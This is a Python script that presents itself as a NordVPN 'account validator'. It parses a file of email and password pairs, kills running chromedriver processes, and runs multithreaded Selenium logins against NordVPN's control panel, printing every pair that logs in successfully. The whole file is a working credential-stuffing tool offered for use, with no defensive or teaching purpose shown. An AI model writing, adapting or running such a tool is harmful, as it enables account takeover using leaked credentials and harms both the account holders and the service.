import re
from colorama import Fore, Style
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from selenium.webdriver import Chrome
from selenium.webdriver import ChromeOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from threading import Thread
from queue import Queue
import time
import psutil
import os

PROXY = ""

PROC_REGX = "chromedriver"

for process in psutil.process_iter():
    proc_name: str = process.name()
    if proc_name.count(PROC_REGX) > 0:
        print(process.kill())


parser = ArgumentParser(description="A damn easy nordvpn account validator")
parser.add_argument(
    "--file", help="The file name containing all username password", required=True, metavar="PATH")
parser.add_argument(
    "--separator", help="Username and password separator", required=True)
parser.add_argument(
    "--workers", help="Set the number of workers. default: 3", default=3, type=int)
args = parser.parse_args()

with open(args.file) as file:
    # pylint: disable=anomalous-backslash-in-string
    raw = re.findall(
        "[a-z].+@.+\..+{}.+".format(args.separator), file.read())

print("{}[!]{} Parsing from '{}'".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, args.file))

print("{}[!]{} {} Credentials found".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, len(raw)))

raw = list(map(lambda cred: {"email": cred.split(args.separator)[
    0], "password": cred.split(args.separator)[1]}, raw))
creds = Queue()

for _ in raw:
    creds.put(_)

options = ChromeOptions()
# options.headless = True

print("{}[!]{} Activated {} workers".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, args.workers))
print("{}[!]{} Working accounts will be listed below in the format {}EMAIL:PASSWORD{}".format(
    Fore.LIGHTYELLOW_EX, Style.RESET_ALL, Fore.LIGHTMAGENTA_EX, Style.RESET_ALL))


def check():
    while not creds.empty():
        cred = creds.get()
        driver = Chrome(options=options)
        driver.get("https://ucp.nordvpn.com/login/")
        wait = WebDriverWait(driver, 20000)
        wait.until(EC.presence_of_element_located((By.NAME, "username")))
        username = driver.find_element_by_name("username")
        password = driver.find_element_by_name("password")
        login = driver.find_element_by_xpath(
            "//button[@class='Button Button--blue Button--block mb-3 mt-5']")
        username.send_keys(cred["email"])
        password.send_keys(cred["password"])
        login.click()

        driver.get("https://ucp.nordvpn.com/login/")
        print(re.findall(r"dashboard", driver.current_url))
        try:
            username = driver.find_element_by_name("username")
        except NoSuchElementException:
            print("{}[#]{} {}:{}".format(Fore.LIGHTGREEN_EX,
                                         Style.RESET_ALL, cred["email"], cred["password"]))
        driver.quit()
        time.sleep(2)


threads = []

for _ in range(args.workers):
    t = Thread(target=check)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()

print("{}[!]{} All Done".format(Fore.LIGHTYELLOW_EX, Style.RESET_ALL))
